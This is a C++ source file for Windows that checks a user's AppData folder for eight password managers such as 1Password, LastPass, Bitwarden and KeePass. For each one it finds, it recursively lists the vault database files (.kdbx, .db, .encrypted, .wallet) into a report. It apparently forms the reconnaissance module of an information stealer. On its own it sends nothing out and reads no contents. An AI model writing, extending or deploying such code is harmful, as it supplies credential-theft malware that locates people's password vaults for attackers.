#include "password_manager_collector.h"
#include <Windows.h>
#include <shlobj.h>
#include <iostream>
#include <sstream>
#include <filesystem>
#include <vector>

std::string PasswordManagerCollector::CollectPasswordManagers() {
    std::ostringstream result;
    result << "\n=== PASSWORD MANAGERS ===\n";
    
    char appdata[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appdata);
    
    std::vector<std::pair<std::string, std::string>> managers = {
        {"1Password", std::string(appdata) + "\\1Password"},
        {"LastPass", std::string(appdata) + "\\LastPass"},
        {"Bitwarden", std::string(appdata) + "\\Bitwarden"},
        {"Dashlane", std::string(appdata) + "\\Dashlane"},
        {"NordPass", std::string(appdata) + "\\NordPass"},
        {"KeePass", std::string(appdata) + "\\KeePass"},
        {"RoboForm", std::string(appdata) + "\\Siber Systems"},
        {"Enpass", std::string(appdata) + "\\Enpass"}
    };
    
    int found = 0;
    for (const auto& [name, path] : managers) {
        if (std::filesystem::exists(path)) {
            result << name << ": FOUND\n";
            found++;
            
            try {
                for (auto& p : std::filesystem::recursive_directory_iterator(path)) {
                    if (p.is_regular_file()) {
                        std::string ext = p.path().extension().string();
                        if (ext == ".kdbx" || ext == ".db" || ext == ".encrypted" || ext == ".wallet") {
                            result << "  Database: " << p.path().filename().string() << "\n";
                        }
                    }
                }
            } catch (...) {
                result << "  Access denied\n";
            }
        }
    }
    
    result << "Total managers found: " << found << "\n";
    
    return result.str();
}
